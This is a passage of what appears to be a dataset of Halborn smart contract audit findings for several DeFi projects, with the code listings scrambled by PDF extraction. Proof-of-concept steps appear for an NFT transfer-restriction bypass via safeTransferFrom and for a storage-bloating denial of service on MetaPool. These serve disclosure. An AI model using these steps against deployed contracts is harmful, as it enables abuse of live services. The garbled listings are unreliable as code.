Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Finance.Vote Team marked function as an external. Listing 15: BasicPoolFactory.sol (Lines 60) 60 61 62 63 64 65 66 67 68 69 70 71 72 73 function addPool ( uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) external managementOnly { numPools = numPools . plus (1) ; Pool storage pool = pools [ numPools ]; pool . id = numPools ; pool . rewardsPerSecondPerToken = rewardsPerSecondPerToken ; pool . startTime = startTime > block . timestamp ? startTime : block . timestamp ; pool . endTime = startTime . plus ( programLengthDays * 1 days ); 29 74 75 76 77 78 79 80 81 82 83 84 pool . depositToken = depositTokenAddress ; require ( rewardsPerSecondPerToken . length == rewardTokenAddresses . length , ' Rewards and reward token arrays must be same length '); for ( uint i = 0; i < rewardTokenAddresses . length ; i ++) { pool . rewardTokens . push ( rewardTokenAddresses [ i ]) ; pool . rewardsClaimed . push (0) ; } pool . maximumDeposit = maxDeposit ; emit PoolAdded ( pool . id ); } 30 MANUAL TESTING 31 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can somehow an external controlled contract call again the function during the execution of it? (Re-entrancy)  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation..  Can an attacker withdraw multiple times?  Can we deposit more than allowed? 4.1 Access Control Test First of all, all contracts access control policies are evaluated. During the tests, the following functions are reachable by only management address. Listing 16 1 function addPool ( 2 3 4 5 6 7 8 uint startTime , uint maxDeposit , uint [] memory rewardsPerSecondPerToken , uint programLengthDays , address depositTokenAddress , address [] memory rewardTokenAddresses ) public managementOnly According to policies, No issues have been found on the dynamic analysis. Figure 1 32 G N I T S E T L A U N A M Figure 1: Testing Access Control Policy 4.2 Multiple Withdraw Test Then, The withdraw progress has been tested. The Halborn Team tried to manipulate withdraw progress. Figure 2 From the test results, It has been observed that the user could not withdraw multiple times from the pools. Next, Test cases ran on the contract functionalities. Multiple withdraw, owner checks are examined. Figure 3  Screenshots 33 G N I T S E T L A U N A M Figure 2: Example Pool Receipt G N I T S E T L A U N A M Figure 3: Multiple Withdraw Test 34 Figure 4: Receipt Owner Check 4.3 Reward Distribution Test Rewards test Test Code Listing 17 1 2 3 4 5 6 7 8 function calculateRewards ( uint startTime , uint endTime , uint rewardsPerSecondPerToken , uint amountDeposited ) public view returns ( uint ) { uint secondsDiff = endTime . minus ( startTime ); uint rewardsLocal ; rewardsLocal = ( secondsDiff . times ( rewardsPerSecondPerToken ). times ( amountDeposited )) / 1 e18 ; return rewardsLocal ; } 35 G N I T S E T L A U N A M Listing 18 1 Time Deposit Time - End Time - Rewards Per Token - Amount Deposits ( WEI ) - Reward - Date Difference 2 3 1624452848 - 1624452849 - 10 4 1624452848 - 1627034048 - 10 5 1624452848 - 1632390848 - 10 6 1624452848 - 1640253248 - 10 Month 7 1624452848 - 1655978048 - 10 8 - 1000000000000000 - 3 - 1 Second - 1000000000000000 - 25812 - 1 Month - 1000000000000000 - 79380 - 3 Month - 1000000000000000 - 158004 - 6 - 1000000000000000 - 315252 - 1 Year  Linear Graph G N I T S E T L A U N A M 36 4.4 Deposit Amount Test In that test case, Deposit amount is checked according to workflow. We tried to deposit to pool more than allowed. However, we are not successful for the manipulation. Figure 5: Deposit Amount Check G N I T S E T L A U N A M 37 ", "labels": ["Halborn", "Finance_Vote_BasicPoolFactory", "Severity: Informational"]}, {"title": "CLAIMED POLICIES CAN BE TRANSFERED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The transferFrom() function in the iBNFT.sol contract overrides the OpenZeppelins ERC721 function to implement checks that prevent a policy NFT from being transferred if the token ID is 0 or above the current ID and prevent the ownership transfer of policies that have been already claimed: Listing 1: iBNFT.sol (Line 83) 78 // Get a positive token price from a chainlink oracle 79 function transferFrom ( address from , 80 address to , 81 82 uint256 tokenId 83 ) whenNotPaused () nonReentrant () public override ( ERC721Upgradeable  , IERC721Upgradeable ) { 84  Policies [ tokenId ]. claimed , \" CLAIMED \"); 85 86 } require ( tokenId >= 1 && tokenId <= _tokenIds . current () && ! super . transferFrom ( from , to , tokenId ); However, the safeTransferFrom() function is not overridden. This allows a user to easily bypass this requirement by using the safeTransferFrom() function instead of transferFrom(). Proof of Concept:  User buys a policy and receives a NFT with token ID 1.  After policy expires, or the option is In-The-Money buyer claims the policy and funds are distributed accordingly.  User tries to transfer the policy to another user using the transferFrom() function iBNFTaddr.transferFrom(buyer1, accounts[3], 1, {'from': buyer1}) 14  Because policy is claimed transaction reverts.  User calls the safeTransferFrom() function instead. Effectively transferring the NFT ownership and bypassing the restriction. iBNFTaddr.safeTransferFrom(buyer1, accounts[3], 1, {'from': buyer1 }) Risk Level: Likelihood - 2 Impact - 3 Recommendation: It is recommended to override the safeTransferFrom() function and add the same check on the iBNFT contract: Listing 2: iBNFT.sol address from , address to , uint256 tokenId 1 function safeTransferFrom ( 2 3 4 5 ) whenNotPaused () nonReentrant () public override ( ERC721Upgradeable  , IERC721Upgradeable ) { 6  Policies [ tokenId ]. claimed , \" CLAIMED \"); 7 8 } require ( tokenId >= 1 && tokenId <= _tokenIds . current () && ! super . safeTransferFrom ( from , to , tokenId ); Remediation Plan: SOLVED: The Bracket.fi team fixed the issue. Both safeTransferFrom functions, one with 3 and the other with 4 parameters, were overridden 15 in the iBNFT contract. Moreover, the requirements were transferred to the 4 safeTransferFrom arguments, while the remaining transfer functions call it internally. 16 ", "labels": ["Halborn", "Bracket_fi_BracketX", "Severity: Low"]}, {"title": "LACK OF DISABLEINITIALIZERS CALL TO PREVENT UNINITIALIZED CONTRACTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Multiple contracts are using the Initializable module from OpenZeppelin. In order to prevent leaving an implementation contract uninitialized OpenZeppelins documentation recommends adding the _disableInitializers function in the constructor to lock the contracts automatically when they are deployed: Listing 3 * @dev Locks the contract , preventing any future reinitialization * Calling this in the constructor of a contract will prevent that * to any version . It is recommended to use this to lock * through proxies . */ 1 /* * 2  . This cannot be part of an initializer call . 3  contract from being initialized or reinitialized 4  implementation contracts that are designed to be called 5 6 7 function _disableInitializers () internal virtual { 8  initializing \"); 9 10 11 12 13 } _initialized = type ( uint8 ). max ; emit Initialized ( type ( uint8 ). max ); require (! _initializing , \" Initializable : contract is if ( _initialized < type ( uint8 ). max ) { } Risk Level: Likelihood - 1 Impact - 3 17 Recommendation: Consider calling the _disableInitializers function in the contract constructor: Listing 4 1 // / @custom : oz - upgrades - unsafe - allow constructor 2 constructor () { 3 4 } _disableInitializers () ; Remediation Plan: Bracket.fi team SOLVED: The _disableInitializers() Config, Offersx, PricingSequencer, iBNFT. the following fixed the to issue. contracts: Added the Bracketxl, 18 ", "labels": ["Halborn", "Bracket_fi_BracketX", "Severity: Low"]}, {"title": "LACK OF PRICE FEED DECIMALS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The PricingSequencer contract contains the getLatestPrice() function to return the latest price from a given Chainlink price feed address. This is intended to be used with USDC pairs, which will return an 8 decimals price which is later on converted to 18 decimals by multiplying it by 1e10. However, a funder can create an offer sending an asset that would return an 18-decimals price; this would lead to the function returning a 28-decimals price. Listing 5: PricingSequencer.sol (Line 542) 526 function getLatestPrice ( address asset ) override public view  returns ( uint ) { 527 // TODO : Add the Sequencer offline check when moving to  production 528 529 530 531 // this is not supported on the testnet if ( checkSequencerState () ) { // If the sequencer is down , do not perform any critical  operations 532 revert ( \" L2 sequencer down : Chainlink feeds are not being  updated \" ); } 533 534 535 536 537 538 539 540 uint80 roundID , // // // // // AggregatorV2V3Interface priceFeed = AggregatorV2V3Interface ( int price , uint startedAt , uint timeStamp , uint80 answeredInRound  asset ); 541 542 543 } (, int price , ,,) = priceFeed . latestRoundData () ; return uint256 ( price ). mul (1 e10 ); 19 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Although the probability of this happening is reduced as the Bracket.fi team has confirmed that they are filtering the offers by asset on the front-end; Halborn recommends whitelisting the assets or checking the decimals of the provided price feed address. This could be done in the setOfferX() function of the Offersx contract, so no funder can set an offer that returns a price other than 8 decimals price. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by adding code to the setOfferX function in the Offersx contract that checks that oracle uses 8 decimals before setting an offer. Although the code is commented out like oracles, it cannot be tested in local environments. Comments should be removed before deploying to production. 20 ", "labels": ["Halborn", "Bracket_fi_BracketX", "Severity: Low"]}, {"title": "> 0 CONSUMES MORE GAS THAN != 0", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of > consumes more gas than !=. There are some cases where both can be used indistinctly, such as in unsigned integers where numbers cant be negative, and as such, there is only a need to check that a number is not 0. Code Location: Bracketx.sol - Line 244: assert(v.id > 0); - Line 376: if (v.addAvailUSDC > 0){ - Line 419: require((amountETH > 0 || amountUSDC > 0), \"BAL\"); - Line 420: if (amountETH > 0){ - Line 424: if (amountUSDC > 0){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: Use != instead of > in cases where both can be used. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by replacing > with != in the specified code. 21 ", "labels": ["Halborn", "Bracket_fi_BracketX", "Severity: Informational"]}, {"title": "POSTFIX OPERATORS CONSUME MORE GAS THAN PREFIX OPERATORS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of postfix operators i++ consume more gas than prefix operators ++i. Code Location: Bracketx.sol - Line 397: for (uint tid = autoClaimPtr; tid <= maxId; tid++ ){ - Line 405: cnt++; Offersx.sol - Line 71: for (uint8 i; i < 12; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use prefix operators rather than postfix. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by replacing the postfix with prefix operators. 22 ", "labels": ["Halborn", "Bracket_fi_BracketX", "Severity: Informational"]}, {"title": "INCREMENTS CAN BE UNCHECKED IN LOOPS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Most of the solidity for loops use an uint256 variable counter that increments by 1 and starts at 0. These increments dont need to be checked for over/underflow because the variable will never reach the max capacity of uint256 as it would run out of gas long before that happens. Code Location: Bracketx.sol - Line 397: for (uint tid = autoClaimPtr; tid <= maxId; tid++ ){ - Line 405: cnt++; Offersx.sol - Line 71: for (uint8 i; i < 12; i++){ Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to uncheck the increments in for loops to save gas. For example, instead of: Listing 6: BracketX.sol 397 for ( uint tid = autoClaimPtr ; tid <= maxId ; tid ++ ) { 398 399 } // Code to be run It could be used to save gas: 23 Listing 7: BracketX.sol 397 for ( uint tid = autoClaimPtr ; tid <= maxId ;) { 398 399 } unchecked { ++ tid ; } Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by unchecking increments in for loops. 24 ", "labels": ["Halborn", "Bracket_fi_BracketX", "Severity: Informational"]}, {"title": "MISSING ZERO ADDRESS CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Bracket_fi_BracketX_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It has been detected that constructors or initializing functions of many smart contracts are missing address validation. For example: Listing 8: Bracketx.sol (Lines 96-100) 85 function initialize ( address _ibnft , 86 address _usdc , 87 address _pricing , 88 address _offers , 89 address _config 90 91 ) external initializer { 92 93 94 95 96 97 98 99 100 101 102 } __Ownable_init () ; __ReentrancyGuard_init () ; __Pausable_init () ; ibnft = _ibnft ; usdc = _usdc ; pricing = _pricing ; offers = _offers ; config = _config ; autoClaimPtr = 1; // first nft is 1 not 0. Every input address should be checked not to be zero, especially the ones that could lead to rendering the contract unusable, lock tokens, etc. This is considered a best practice. Code Location: Bracketx.sol - Line 85-102: initialize() iBNFT.sol - Line 40-42: setBrkt() 25 Offersx.sol - Line 39-46: initialize() Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to validate that each address inputs in the constructor and other critical functions are non-zero. Remediation Plan: SOLVED: The Bracket.fi team fixed the issue by implementing non-zero address requirements in the initialized function of contracts. 26 MANUAL TESTING 27 Halborn performed several manual tests in the following contracts:  BracketX.sol  Config.sol  iBNFT.sol  PricingSequencer.sol  Offersx.sol  StructLibx.sol The manual tests were focused on testing the main functions of these contracts:  addAvailable()  reduceAvailable()  buyPolicy()  claim()  autoClaim()  checkVer()  addVer()  transferFrom()  mintNFTinsured()  getOffer()  setOfferx()  getLatestPrice()  checkSequencerState()  multFactor() No issues were found during the manual tests. 28 G N I T S E T L A U N A M ", "labels": ["Halborn", "Bracket_fi_BracketX", "Severity: Informational"]}, {"title": "MISSING ZERO ADDRESS CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Safety Module contracts have address fields on multiple functions. These functions have missing address validations. Every address should be validated and checked that is different from zero. This is also considered a best practice. During the test, it has seen some of these inputs are not protected against using the address(0) as the target address. Code Location: Listing 1: StakedToken.sol (Lines 50,58) IERC20 stakedToken , IERC20 rewardToken , uint256 cooldownSeconds , uint256 unstakeWindow , address rewardsVault , address emissionManager , uint128 distributionDuration , string memory name , string memory symbol , uint8 decimals , address governance 44 function __StakedToken_init ( 45 46 47 48 49 50 51 52 53 54 55 56 57 58  distributionDuration ); 59 60 61 62 63 64 65 stakedToken , rewardToken , cooldownSeconds , unstakeWindow , rewardsVault , governance __StakedToken_init_unchained ( ) internal initializer { __ERC20_init_unchained ( name , symbol , decimals ); __DistributionManager_init_unchained ( emissionManager , 13 66 67 ); } Listing 2: EcosystemReserve.sol (Line 32) 31 function initialize ( address reserveController ) external  initializer { 32 33 _setFundsAdmin ( reserveController ); } Listing 3: EcosystemReserve.sol (Line 52) 51 function setFundsAdmin ( address admin ) external override  onlyFundsAdmin { 52 53 _setFundsAdmin ( admin ); } Recommendation: It is recommended to validate that every address input is different from zero. Remediation Plan: SOLVED: Moonwell Finance team solved this issue by adding multiple zero address checks to the code. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e 14 ", "labels": ["Halborn", "Moonwell_Finance_Safety_Module", "Severity: Low"]}, {"title": "MISSING REENTRANCY GUARD", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "To protect against cross-function re-entrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the withdrawal function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against re-entrancy attacks. Code Location: Listing 4: EcosystemReserve.sol IERC20 token , address recipient , uint256 amount 43 function transfer ( 44 45 46 47 48 49 } ) external override onlyFundsAdmin { token . transfer ( recipient , amount ); Listing 5: StakedToken.sol 85 function stake ( address onBehalfOf , uint256 amount ) external  override { 86 87 88 require ( amount != 0 , ' INVALID_ZERO_AMOUNT '); require ( onBehalfOf != address (0) , ' STAKE_ZERO_ADDRESS '); uint256 balanceOfUser = balanceOf ( onBehalfOf ); Listing 6: StakedToken.sol 114 function redeem ( address to , uint256 amount ) external override { require ( amount != 0 , ' INVALID_ZERO_AMOUNT '); 115 require ( to != address (0) , ' REDEEM_ZERO_ADDRESS '); 116 // solium - disable - next - line 117 15 118 uint256 cooldownStartTimestamp = stakersCooldowns [ msg .  sender ]; Listing 7: StakedToken.sol 161 function claimRewards ( address to , uint256 amount ) external  override { 162 163 164 165 166 uint256 newTotalRewards = _updateCurrentUnclaimedRewards ( msg . sender , balanceOf ( msg . sender ) , false ); Risk Level: Likelihood - 2 Impact - 2 Recommendation: The functions on the code location section have missing nonReentrant modifiers. It is recommended to add OpenZeppelin ReentrancyGuard library to the project and use the nonReentrant modifier to avoid introducing future re-entrancy vulnerabilities. Remediation Plan: SOLVED: This issue was solved by implementing nonReentrant modifier to specified functions above. Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e 16 ", "labels": ["Halborn", "Moonwell_Finance_Safety_Module", "Severity: Low"]}, {"title": "USE 1E18 CONSTANT FOR GAS OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It is In Solidiy, exponentiation operation (**) costs up to 10 gas. possible to consume less gas to calculate token prices if DECIMAL variable is fixed. Code Location: Listing 8: DistributionManager.sol 201 return principalUserBalance . mul ( reserveIndex . sub ( userIndex )) . div  (10** uint256 ( PRECISION )) ; Listing 9: DistributionManager.sol 232 emissionPerSecond . mul ( timeDelta ). mul (10** uint256 ( PRECISION )) . div (  totalBalance ). add ( currentIndex ); Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use 1e18 instead of (10 ** 18) on price calculations to optimize gas usage. Remediation Plan: SOLVED: Moonwell Finance team solved this issue by using 1e18 instead of (10 ** PRECISION) on the code. 17 Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e Example PoC: Listing 10: Gas Usage Comparison 1 pragma solidity 0.8.7; 2 contract Null { 3 4 5 6 7 8 9 10 } } constructor () {} function test () public view returns ( uint256 ) { return 10 ** 18; // gas usage : 21407 } function test2 () public view returns ( uint256 ) { return 1 e18 ; // gas usage : 21379 18 ", "labels": ["Halborn", "Moonwell_Finance_Safety_Module", "Severity: Informational"]}, {"title": "USE ++I INSTEAD OF I++ IN LOOPS FOR GAS OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In all the loops, the variable i is incremented using i++. It is known that, in loops, using ++i costs less gas per iteration than i++. This also affects variables incremented inside the loop code block. Code Location: Listing 11: DistributionManager.sol 48 for ( uint256 i = 0; i < assetsConfigInput . length ; i ++) { 49  assetsConfigInput [ i ]. underlyingAsset ]; AssetData storage assetConfig = assets [ Listing 12: DistributionManager.sol _updateUserAssetInternal ( accruedRewards = accruedRewards . add ( 146 for ( uint256 i = 0; i < stakes . length ; i ++) { 147 148 149 150 151 152 153 154 user , stakes [ i ]. underlyingAsset , stakes [ i ]. stakedByUser , stakes [ i ]. totalStaked ); ) Listing 13: DistributionManager.sol 173 for ( uint256 i = 0; i < stakes . length ; i ++) { 174 AssetData storage assetConfig = assets [ stakes [i ].  underlyingAsset ]; 175 176 177 uint256 assetIndex = _getAssetIndex ( assetConfig . index , assetConfig . emissionPerSecond , 19 178 179 180 ); assetConfig . lastUpdateTimestamp , stakes [ i ]. totalStaked Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to use ++i instead of i++ to increment the value of an uint variable inside a loop. This also applies to the variables declared inside the for loop, not just the iterator. On the other hand, this is not applicable outside of loops. Remediation Plan: team SOLVED: post-increment to pre-increment. Moonwell Finance solved this issue by replacing Commit ID: e23657c5fbeb12c7393fa49da6f350dc0bd5114e 20 ", "labels": ["Halborn", "Moonwell_Finance_Safety_Module", "Severity: Informational"]}, {"title": "USE IMMUTABLE KEYWORD FOR GAS OPTIMIZATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Moonwell_Finance_Safety_Module_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The immutable keyword was added to Solidity in 0.6.5. State variables can be marked immutable which causes them to be read-only, but only assignable in the constructor. The following state variables are missing the immutable modifier:  STAKED_TOKEN  REWARD_TOKEN  COOLDOWN_SECONDS There are no setter functions to change values of variables above. If these variables do not need to be changed, they should be defined with immutable keyword. Code Location: Listing 14: StakedToken.sol 23 IERC20 public STAKED_TOKEN ; 24 IERC20 public REWARD_TOKEN ; 25 uint256 public COOLDOWN_SECONDS ; 26 27 // / @notice Seconds available to redeem once the cooldown period  is fulfilled 28 uint256 public UNSTAKE_WINDOW ; Risk Level: Likelihood - 1 Impact - 1 21 Recommendation: It is recommended to add the immutable modifier to the state variables mentioned to save some gas. Remediation Plan: NOT APPLICABLE: Immutable variables can only be initialized inline or assigned directly in the constructor. In this finding, there is no Attempting to explicit constructor in initializable smart contracts. set the immutable keyword for variables specified above may break their operation. 22 ", "labels": ["Halborn", "Moonwell_Finance_Safety_Module", "Severity: Informational"]}, {"title": "DENIAL OF SERVICE CONDITION DUE TO STORAGE BLOATING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that the MetaPool contract does not require a storage deposit from users to cover fees associated with storing stNEAR balance. Additionally, it is possible to send tokens to the previously unseen user, in such a scenario, the contract will reserve storage for the newly The contract will be deducting NEAR to free balance to created user. cover the storage fees. However, if a contract will not have a sufficient free balance, it will cause the transaction to fail and all subsequent attempts at increasing the storage usage will fail until the contracts free balance is increased. Hence, it is possible for a malicious user to create multiple accounts and use them as receivers for token transfers with small value. Sufficient number of such transactions will bloat the contracts storage, leading to a Denial Of Service condition regarding creating new balances, which will directly impact the staking process - core functionality of the contract. It is worth noting that this vulnerability does not impact token transfers among users who have already saved balances, and the Denial Of Service condition can be reverted by sending more NEAR tokens to the MetaPool contract. Code Location: Listing 1: metapool/src/internal.rs (Line 565) & mut self , sender_id : & AccountId , receiver_id : & AccountId , amount : u128 , 553 pub fn internal_st_near_transfer ( 554 555 556 557 558 ) { 559 560 561 assert_ne! ( sender_id , receiver_id , \" Sender and receiver should be different \" 19 562 563 564 565  ; 566 567 568 569 570 571 572 573 ); assert! ( amount > 0, \" The amount should be a positive number \"); let mut sender_acc = self . internal_get_account (& sender_id ); let mut receiver_acc = self . internal_get_account (& receiver_id ) assert! ( amount <= sender_acc . stake_shares , \" @ {} not enough stNEAR balance {} \" , sender_id , sender_acc . stake_shares ); let near_amount = self . amount_from_stake_shares ( amount ); //  amount is in stNEAR ( aka shares ) , let ' s compute how many nears that  is - for acc . staking_meter 574 575 576 577 578 579 } sender_acc . sub_stake_shares ( amount , near_amount ); receiver_acc . add_stake_shares ( amount , near_amount ); self . internal_update_account (& sender_id , & sender_acc ); self . internal_update_account (& receiver_id , & receiver_acc ); Listing 2: metapool/src/internal.rs (Line 438) 438 pub ( crate ) fn internal_get_account (& self , account_id : & String ) ->  Account { self . accounts . get ( account_id ). unwrap_or_default () 439 440 } BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:C/D:N/Y:N/R:P/S:U (5.0) Proof Of Concept: Please note that this Proof Of Concept uses an add_tokens_to function that is not present in the actual contract. It was added as a helper to create a state with balances to shorten the execution time of the test case. Its definition is as follows: 20 Listing 3: metapool/src/lib.rs (Line 361) 361 pub fn add_tokens_to (& mut self , account_id : AccountId ) { 362 363 364 365 } let mut account = self . internal_get_account (& account_id ); account . add_stake_shares (10000000000000000000 , 100000000000) ; self . internal_update_account (& account_id , & account ); Listing 4: src/halborn_testcases/storage_bloating.rs let get_epoch_wasm = std :: fs :: read ( GET_EPOCH_CONTRACT_PATH ) ?; let user_count = 6; let metapool_wasm = std :: fs :: read ( LIQUID_STAKING_CONTRACT_PATH let owner = root_account let staking_pool_wasm = std :: fs :: read ( let worker = workspaces :: sandbox () . await ?; let root_account = worker . root_account () ?; . create_subaccount (\" contract - owner \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; 39 #[ tokio :: test ] 40 async fn storage_bloating () -> anyhow :: Result <() > { 41 42  ) ?; 43  STAKING_POOL_CONTRACT_PATH ) ?; 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 . create_subaccount (\" treasury \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; . create_subaccount (\" operator \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let meta_token = root_account let operator = root_account let treasury = root_account . create_subaccount (\" meta_token_contract_account \" ) . initial_balance (199999999999999900000000000) . transact () 21 let metapool = root_account . create_subaccount (\" metapool \" ) . initial_balance (5000000000000000000000000) // 5 NEAR to let get_epoch_acc = root_account . create_subaccount (\" get_epoch_acc \" ) . initial_balance (199999999999999900000000000) . transact () . await ? . into_result () ?; let mut user_accounts = Vec :: with_capacity ( user_count ); for n in 0.. user_count { let this_user_account = root_account . create_subaccount (& user_account_name (n )) . initial_balance (19999999999999990000000000000) . transact () . await ? . into_result () ?; user_accounts . push ( this_user_account ); . await ? . into_result () ?; . transact () . await ? . into_result () ?; 71 72 73 74 75  expedite execution 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97  . await ?. into_result () ?; 98 99 100 101 102 103 104 105 get_epoch_contract } . call ( \" new \") . args_json ( json! ({}) ) . transact () . await ? . into_result () ?; let get_epoch_contract = get_epoch_acc . deploy (& get_epoch_wasm ) let metapool_contract = metapool . deploy (& metapool_wasm ). await  ?. into_result () ?; 106 107 108 109 110 111 metapool_contract . call ( \" new \") . args_json ( json! ({ \" owner_account_id \": owner . id () , \" treasury_account_id \": treasury . id () , \" operator_account_id \": operator . id () , 22 \" meta_token_account_id \" : meta_token . id () , }) ) . transact () . await ? . into_result () ?; let mut sp_contracts = Vec :: with_capacity (4) ; let mut set_staking_pools_arg = Vec :: with_capacity (4) ; let weights_vec : Vec < u8 > = vec! [15 , 16 , 20 , 49]; for n in 0..=3 { let staking_pool_n = root_account . create_subaccount (& sp_contract_name ( n)) . initial_balance (19999999999999990000000000000) . transact () . await ? . into_result () ?; let staking_pool_contract_n = staking_pool_n . deploy (& staking_pool_wasm ) . await ? . into_result () ?; staking_pool_contract_n . call ( \" new \" ). args_json ( json! ({ 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 \" owner_id \" : owner . id () , \" stake_public_key \": \"  Di8H4S8HSwSdwGABTGfKcxf1HaVzWSUKVH1mYQgwHCWb \" , 135 \" reward_fee_fraction \": RewardFeeFraction { numerator :  5, denominator : 100} 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 }) ); owner . call ( metapool_contract . id () , \" add_staking_pool \" ) . args_json ( json! ({ \" account_id \" : staking_pool_contract_n . id () , }) ) . transact () . await ? . into_result () ?; let this_arg = StakingPoolArgItem { account_id : staking_pool_contract_n . id () . clone () , weight_basis_points : weights_vec [ n ] as u16 * 100 , }; set_staking_pools_arg . push ( this_arg ); sp_contracts . push ( staking_pool_contract_n ); } 23 154 155 156 157 158 159 160 161 162 163 owner . call ( metapool_contract . id () , \" set_staking_pools \" ) . args_json ( json! ({ \" list \": set_staking_pools_arg }) ) . deposit (1) . transact () . await ? . into_result () ?; // Note : This function was added as a helper to shorten the  execution of the test case 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 // It is not present in the actual contract user_accounts [0] . call ( metapool_contract . id () , \" add_tokens_to \" ) . args_json ( json! ({ \" account_id \": user_accounts [0]. id () , }) ) . transact () . await ? . into_result () ?; user_accounts [0] . call ( metapool_contract . id () , \" add_tokens_to \" ) . args_json ( json! ({ \" account_id \": user_accounts [1]. id () , }) ) . transact () . await ? . into_result () ?; // Storage bloating via many small transfers let mut dummy_user_index = 0; println! (\" Starting vulnerable scenario ... \" ); loop { let this_user_account_id = format! ( \" dummyuser {} \" ,  dummy_user_index ); 188 189 190 191 192 193 194 195 user_accounts [0] . call ( metapool_contract . id () , \" ft_transfer \") . args_json ( json! ({ \" receiver_id \" : this_user_account_id , \" amount \": \"1 \" , \" memo \" : None :: < String > }) ) 24 196 197 198 199 200 201 202 203 204 205 } . deposit (1) . transact () . await ? . into_result () ?; dummy_user_index += 1; } Ok (() ) Recommendation: It is recommended to require a storage deposit from new users so that the storage fees will always be covered. Alternatively, if such a mechanism is not possible to be implemented for business reasons, the balance of the contract should be constantly monitored, and NEAR tokens should be automatically deposited to the contract once free balance reaches a previously defined threshold. Remediation Plan: SOLVED: The MetaPool team solved this issue in commit f11ba493 by imple- menting a storage fee mechanism. 25 ", "labels": ["Halborn", "MetaPool_Liquid_Staking_NEAR", "Severity: Medium"]}, {"title": "USAGE OF OUTDATED DEPENDENCIES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/MetaPool_Liquid_Staking_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was observed that dependencies defined in Cargo.toml file for MetaPool contract are not using their latest versions. Namely:  near-sdk  near-contract-standards  uint  quickcheck  quickcheck_macros  env_logger Code Location: Listing 5: metapool/Cargo.toml (Lines 16,17,24,28,29,31) 11 [ dependencies ] 12 13 # near - sdk = \" 2.0.1 \" 14 # near - sdk = { git = \" https :// github . com / Narwallets / near - sdk - rs 